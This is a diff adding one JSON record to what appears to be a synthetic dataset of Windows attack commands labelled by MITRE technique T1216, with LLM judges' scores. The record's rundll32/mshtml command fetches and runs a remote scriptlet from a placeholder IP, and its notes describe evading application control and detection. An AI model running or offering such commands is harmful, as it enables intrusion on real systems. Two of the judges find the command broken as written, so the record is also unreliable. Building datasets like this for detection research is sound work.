@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:https://198.51.100.10/payload.sct\")",
+  "explanation": "Uses rundll32 to invoke MSHTML's RunHTMLApplication as a script proxy, which then loads and executes a remote scriptlet via the script: moniker. This relies on signed, native components to proxy execution, commonly allowed by application control.",
+  "rationale_steps": [
+    "From PowerShell, launch rundll32 with the javascript handler to reach MSHTML's RunHTMLApplication export.",
+    "Within the JScript context, use GetObject with the script: moniker to fetch and execute a remote .sct scriptlet.",
+    "Execution runs under user context and leverages trusted binaries, aiding control bypass and limiting detections to unusual parameter usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-784933d5",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid syntax for rundll32.exe invocation, and correct use of the javascript protocol handler and GetObject method.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1216 (System Script Proxy Execution) as it uses rundll32.exe to proxy execution through mshtml (a trusted Windows component) to retrieve and execute remote code via a scriptlet.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:35:51.396793Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The semicolon incorrectly separates the GetObject call from the javascript: argument passed to rundll32.exe, causing the remote scriptlet to not be invoked by MSHTML.",
+        "semantic_score": 2,
+        "semantic_justification": "While the chosen components are conceptually aligned with T1216, the command's critical syntax error prevents the execution of the remote scriptlet via MSHTML, thus failing to achieve its stated intent.",
+        "combined_score": 2.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:36:13.222939Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "In PowerShell the command is well-formed with balanced quotes and parses into two valid statements separated by a semicolon.",
+        "semantic_score": 2,
+        "semantic_justification": "Because PowerShell treats the semicolon as a statement separator, the JavaScript payload is not passed to rundll32 and GetObject is attempted as a separate (undefined) command, so it does not achieve proxy execution via mshtml as claimed.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:36:38.618376Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
